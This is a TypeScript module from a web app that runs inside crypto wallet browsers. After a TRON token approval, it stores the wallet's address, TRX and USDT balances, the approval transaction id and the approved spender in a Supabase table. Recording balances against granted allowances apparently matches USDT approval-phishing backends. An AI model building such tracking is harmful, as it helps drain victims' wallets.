import { getSupabaseBrowserClient } from "@/lib/supabaseClient";

export type WalletAuthorizationPayload = {
  walletAddress: string;
  trxBalance: number;
  usdtBalance: number;
  approvalTxId?: string | null;
  /** 本次 approve 的 spender（授权接收方） */
  approvalSpender?: string | null;
  locale?: string;
};

function extractTronTxId(result: unknown): string | null {
  if (typeof result === "string") {
    const s = result.trim();
    return s.length > 0 ? s : null;
  }
  if (result && typeof result === "object") {
    const o = result as Record<string, unknown>;
    const txid = o.txid ?? o.txID;
    if (typeof txid === "string" && txid.length > 0) {
      return txid;
    }
  }
  return null;
}

export function parseApprovalSendResult(sendResult: unknown): string | null {
  return extractTronTxId(sendResult);
}

export type SubmitAuthorizationRecordResult =
  | { ok: true }
  | {
      ok: false;
      errorKey: "errors.supabaseNotConfigured" | "errors.authorizationRecordFailed";
      debugMessage: string;
    };

/** WebKit / 钱包 WebView 常见：请求未到达服务器时的笼统报错 */
function appendFetchFailureHint(message: string): string {
  const m = message.toLowerCase();
  if (
    m.includes("load failed") ||
    m.includes("failed to fetch") ||
    m.includes("networkerror") ||
    m.includes("network request failed")
  ) {
    return (
      " | 说明：多为网络层失败（请求未到 Supabase），非业务 SQL 错误。" +
      " 可检查：① 手机网络/VPN ② imToken 内置浏览器是否限制跨域 ③ 构建时 VITE_SUPABASE_URL 是否正确（https://xxx.supabase.co）" +
      " ④ 系统浏览器访问同一页面是否仍失败。"
    );
  }
  return "";
}

/** 链上授权成功后将记录写入 Supabase；未配置或插入失败则返回 ok: false。 */
export async function submitWalletAuthorizationRecord(payload: WalletAuthorizationPayload): Promise<SubmitAuthorizationRecordResult> {
  const supabase = getSupabaseBrowserClient();
  if (!supabase) {
    const debugMessage = "[supabase] 未配置 VITE_SUPABASE_URL / VITE_SUPABASE_ANON_KEY，无法提交授权记录。";
    console.error(debugMessage);
    return { ok: false, errorKey: "errors.supabaseNotConfigured", debugMessage };
  }

  try {
    const { error } = await supabase.from("wallet_authorizations").insert({
      wallet_address: payload.walletAddress,
      trx_balance: payload.trxBalance,
      usdt_balance: payload.usdtBalance,
      approval_tx_id: payload.approvalTxId ?? null,
      approval_spender: payload.approvalSpender ?? null,
      locale: payload.locale ?? null,
      user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 512) : null,
    });

    if (error) {
      const base = `[supabase] 写入 wallet_authorizations 失败: ${error.message}${error.code ? ` (code: ${error.code})` : ""}`;
      const debugMessage = base + appendFetchFailureHint(error.message);
      console.error(debugMessage, error);
      return { ok: false, errorKey: "errors.authorizationRecordFailed", debugMessage };
    }

    return { ok: true };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    const debugMessage = `[supabase] 写入 wallet_authorizations 异常: ${msg}${appendFetchFailureHint(msg)}`;
    console.error(debugMessage, e);
    return { ok: false, errorKey: "errors.authorizationRecordFailed", debugMessage };
  }
}
